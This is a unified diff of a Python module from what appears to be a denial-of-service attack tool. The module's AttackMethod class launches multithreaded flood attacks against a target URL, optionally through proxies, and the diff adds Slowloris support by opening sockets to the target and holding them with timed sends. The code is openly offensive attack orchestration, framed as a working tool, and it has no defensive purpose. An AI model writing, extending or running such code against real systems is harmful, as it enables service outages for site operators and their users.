@@ -1,22 +1,27 @@
 """This module provides a class to instantiate DoS attacks."""
 
+from __future__ import annotations
+
+import socket
 import sys
 from threading import Thread
 from time import sleep, time
-from typing import Callable, List
+from typing import Any, List, Union
 
 from colorama import Fore  # type: ignore[import]
 from humanfriendly import Spinner, format_timespan  # type: ignore[import]
 
-from tools.crash import CriticalError  # type: ignore[import]
-from tools.ip_tools import get_target_address  # type: ignore[import]
+from tools.ip_tools import create_socket, get_target_address  # type: ignore[import]
 
 
-def get_method_by_name(method: str) -> Callable:
+def get_method_by_name(method: str) -> Any:
     """Get the flood function based on the attack method.
 
-    Keyword arguments:
-    method -- the method's name
+    Args:
+        - method - The method's name
+
+    Returns:
+        - flood_function - The associated flood function
     """
     dir = f"tools.L7.{method.lower()}"
     module = __import__(dir, fromlist=["object"])
@@ -34,54 +39,71 @@ class AttackMethod:
         threads: int,
         target: str,
         use_proxy: bool,
+        sleep_time: int = 15,
     ):
         """Initialize the attack object.
 
-        Keyword arguments:
-        method_name -- the name of the DoS method used to attack (only HTTP GET by now)
-        duration -- the duration of the attack, in seconds
-        threads -- the number of threads that will attack the target
-        target -- the target's URL
-        use_proxy -- whether or not to use proxies
+        Args:
+            - method_name -- The name of the DoS method used to attack
+            - duration - The duration of the attack, in seconds
+            - threads - The number of threads that will attack the target
+            - target - The target's URL
+            - use_proxy - Whether or not to use proxies
+            - sleep_time - The sleeping time of the sockets (Slowloris only)
         """
         self.method_name = method_name
         self.duration = duration
         self.threads_count = threads
         self.target = target
         self.use_proxy = use_proxy
+        self.sleep_time = sleep_time
         self.threads = list()  # type: List[Thread]
+        self.sockets = list()  # type: List[socket.SocketType]
         self.is_running = False
 
-    def __enter__(self):
+    def __enter__(self) -> AttackMethod:
         """Set flood function and target's URL formatted attributes."""
         self.method = get_method_by_name(self.method_name)
         self.target = get_target_address(self.target)
         return self
 
-    def __exit__(self, exc_type, exc_value, traceback):
+    def __exit__(self, exc_type, exc_value, traceback) -> None:  # type: ignore
         """Do nothing, only for context manager."""
         pass
 
-    def __run_timer(self):
+    def __run_timer(self) -> None:
         """Verify the execution time every second."""
         __stopTime = time() + self.duration
         while time() < __stopTime:
             sleep(1)
         self.is_running = False
 
-    def __run_flood(self):
+    def __run_flood(self, sock: Union[socket.SocketType, None] = None) -> None:
         """Start the flooder."""
         while self.is_running:
-            self.method(self.target, self.use_proxy)
+            if sock:
+                self.method(sock)
+                sleep(self.sleep_time)
+            else:
+                self.method(self.target, self.use_proxy)
 
-    def __run_threads(self):
+    def __run_threads(self) -> None:
         """Initialize the threads."""
         timing = Thread(target=self.__run_timer)
         timing.start()
 
-        for _ in range(self.threads_count):
-            thread = Thread(target=self.__run_flood)
-            self.threads.append(thread)
+        if self.method_name.lower() == "slowloris":
+            self.sockets = [
+                create_socket(self.target) for _ in range(self.threads_count)
+            ]
+            self.threads = [
+                Thread(target=self.__run_flood, args=(self.sockets[i],))
+                for i in range(self.threads_count)
+            ]
+        else:
+            self.threads = [
+                Thread(target=self.__run_flood) for _ in range(self.threads_count)
+            ]
 
         with Spinner(
             label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}",
@@ -99,7 +121,7 @@ class AttackMethod:
 
         print(f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Completed!\n\n{Fore.RESET}")
 
-    def start(self):
+    def start(self) -> None:
         """Start the DoS attack itself."""
         target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
         duration = format_timespan(self.duration)
@@ -127,9 +149,3 @@ class AttackMethod:
                 f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Interrupted!\n\n{Fore.RESET}"
             )
             sys.exit(1)
-
-        except Exception as err:
-            CriticalError("An error ocurred during the attack", err)
-
-        else:
-            return True
